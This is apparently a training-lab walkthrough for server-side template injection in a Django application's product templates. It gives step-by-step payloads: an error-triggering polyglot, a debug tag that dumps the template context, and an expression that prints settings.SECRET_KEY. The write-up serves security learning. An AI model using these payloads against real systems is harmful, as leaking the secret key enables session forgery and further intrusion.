# Exploitation Steps

## 1. Log in

Authenticate using the provided credentials.

```
Username: wiener
Password: peter
```

Navigate to:

```
My Account → Product Templates
```

---

## 2. Identify the Template Engine

Replace one of the existing template expressions with an invalid payload:

```text
${{<%[%'"}}%\
```

Save the template.

The resulting error page identifies **Django** as the underlying template engine.

---

## 3. Enumerate the Template Context

Remove the invalid payload and replace it with:

```django
{% debug %}
```

Save the template.

The application now renders every object available within the template context.

Example:

```
request
user
messages
settings
...
```

The most interesting object is:

```
settings
```

---

## 4. Read the SECRET_KEY

Replace the debug statement with:

```django
{{settings.SECRET_KEY}}
```

Save the template again.

The page now renders the Django secret key.

Example:

```
8kg!l8af#3m@d7w...
```

---

## 5. Submit the Solution

Copy the displayed value.

Click:

```
Submit Solution
```

Paste the retrieved `SECRET_KEY`.

The lab is successfully solved.

